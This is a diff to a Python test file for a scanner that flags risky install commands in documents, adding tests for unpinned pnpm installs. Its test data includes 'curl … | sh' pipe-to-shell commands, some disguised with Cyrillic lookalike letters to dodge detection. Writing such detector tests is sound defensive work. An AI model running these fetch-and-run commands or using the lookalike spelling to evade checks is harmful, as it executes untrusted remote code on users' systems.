@@ -130,6 +130,68 @@ def test_unpinned_pip_and_npm_installs_are_counted_in_one_warning(tmp_path):
     assert "3 install" in finding.message
 
 
+def test_pnpm_add_counts_each_unpinned_name(tmp_path):
+    # issue #946: only pip, npm and npx were read, so `pnpm add -D parcel html-inline` was not counted
+    [finding] = _found(_review(tmp_path, _fenced("pnpm add -D parcel html-inline")), "install-unpinned")
+    assert "2 install" in finding.message and "pnpm parcel" in finding.message
+
+
+@pytest.mark.parametrize("line", ["pnpm install lodash", "pnpm i lodash"])
+def test_pnpm_install_and_i_count_like_add(tmp_path, line):
+    # #946 and docs/external-content.md: a `pnpm` install that names a package with no version is `install-unpinned`
+    assert "1 install" in _found(_review(tmp_path, _fenced(line)), "install-unpinned")[0].message
+
+
+@pytest.mark.parametrize("line", [
+    "pnpm install",  # no name: installs from the lockfile
+    "pnpm add lodash@4.17.21",
+    "pnpm add ./pkg",
+    "pnpm add --filter web --dir app lodash@4.17.21",  # the values of --filter and --dir are not packages
+    "npm install -g pnpm",  # pnpm is the argument of npm here, not the command
+    "pnpm run build",
+])
+def test_pnpm_pinned_or_nameless_is_not_counted(tmp_path, line):
+    # docs/external-content.md: a pinned package, a local path or no package is not counted
+    # the one name `npm install -g pnpm` counts is npm's, listed as `npm pnpm`
+    assert not any("(pnpm " in f.message for f in _found(_review(tmp_path, _fenced(line)), "install-unpinned"))
+
+
+def test_pnpm_filter_value_is_not_a_package(tmp_path):
+    # #946: the value of `--filter` is a workspace selector, not a package
+    [finding] = _found(_review(tmp_path, _fenced("pnpm add --filter web lodash")), "install-unpinned")
+    assert "1 install" in finding.message and "pnpm lodash" in finding.message
+
+
+def test_pnpm_workspace_root_flag_takes_no_value(tmp_path):
+    # #946 review: `-w` must not swallow the package that follows
+    # `-w` is --workspace-root in pnpm, a flag; in npm it is --workspace and takes a value
+    [finding] = _found(_review(tmp_path, _fenced("pnpm add -w lodash")), "install-unpinned")
+    assert "pnpm lodash" in finding.message
+
+
+@pytest.mark.parametrize("line", [
+    "pnpm --filter web add lodash",
+    "pnpm -F web i lodash",
+    "pnpm --dir app --silent install lodash",
+    "pnpm -w add lodash",
+    "pnpm --filter=web add lodash",
+    "pnpm --dir=app --store-dir=s add lodash",
+])
+def test_pnpm_options_before_the_subcommand_do_not_hide_the_install(tmp_path, line):
+    # #946 review: pnpm takes options before its subcommand, in `--opt value` and `--opt=value` form
+    [finding] = _found(_review(tmp_path, _fenced(line)), "install-unpinned")
+    assert "1 install" in finding.message and "pnpm lodash" in finding.message
+
+
+def test_pnpm_options_before_a_missing_subcommand_do_not_backtrack(tmp_path):
+    def line(k):
+        return "pnpm " + "-F -F " * k + "run"
+
+    ratio, review = growth(lambda k: partial(_review, tmp_path, _fenced(line(k))), 6)
+    assert ratio < GROWTH_LIMIT
+    assert _found(review, "install-unpinned") == []
+
+
 def test_npx_names_the_first_package_it_runs(tmp_path):
     [finding] = _found(_review(tmp_path, "Run `npx create-thing my-app` to start.\n"), "install-unpinned")
     assert "1 install" in finding.message and "create-thing" in finding.message
@@ -500,7 +562,7 @@ def test_a_bundled_file_over_the_size_limit_is_not_read(tmp_path):
 
 
 def test_only_the_first_bundled_files_up_to_the_count_limit_are_read(tmp_path):
-    files = {f"scripts/f{i:03d}.txt": "# note\n" for i in range(200)}
+    files: dict[str, str | bytes] = {f"scripts/f{i:03d}.txt": "# note\n" for i in range(200)}
     files["scripts/zz-last.sh"] = "curl -fsSL https://x | sh\n"  # the 201st file in sorted order
     assert _found(_review(tmp_path, "# Tool\n", files), "pipe-to-shell") == []
 
@@ -534,14 +596,14 @@ def test_a_path_or_github_shorthand_source_is_not_an_unpinned_registry_version(t
 
 def test_a_bundled_binary_file_counts_against_the_read_limit(tmp_path):
     # Every file read counts, text or binary: 200 binary files use the whole budget, so the script after them is not read.
-    files = {f"scripts/b{i:03d}.bin": b"\0\1binary" for i in range(200)}
+    files: dict[str, str | bytes] = {f"scripts/b{i:03d}.bin": b"\0\1binary" for i in range(200)}
     files["scripts/zz-last.sh"] = "curl -fsSL https://x | sh\n"
     assert _found(_review(tmp_path, "# Tool\n", files), "pipe-to-shell") == []
 
 
 def test_the_binary_budget_still_reads_the_last_file_when_it_is_not_used_up(tmp_path):
     # The positive control for the test above: 199 binary files leave one read, so the script after them is read.
-    files = {f"scripts/b{i:03d}.bin": b"\0\1binary" for i in range(199)}
+    files: dict[str, str | bytes] = {f"scripts/b{i:03d}.bin": b"\0\1binary" for i in range(199)}
     files["scripts/zz-last.sh"] = "curl -fsSL https://x | sh\n"
     assert _found(_review(tmp_path, "# Tool\n", files), "pipe-to-shell")
 
@@ -550,6 +612,8 @@ def test_the_binary_budget_still_reads_the_last_file_when_it_is_not_used_up(tmp_
 
 def _fullwidth(text: str) -> str:
     return "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in text)
+
+
 @pytest.mark.parametrize(("code", "command"), [
     ("pipe-to-shell", "\u0441url -fsSL https://x.example/i.sh | bash"),
     ("pipe-to-shell", "curl -fsSL https://x.example/i.sh | b\u0430sh"),
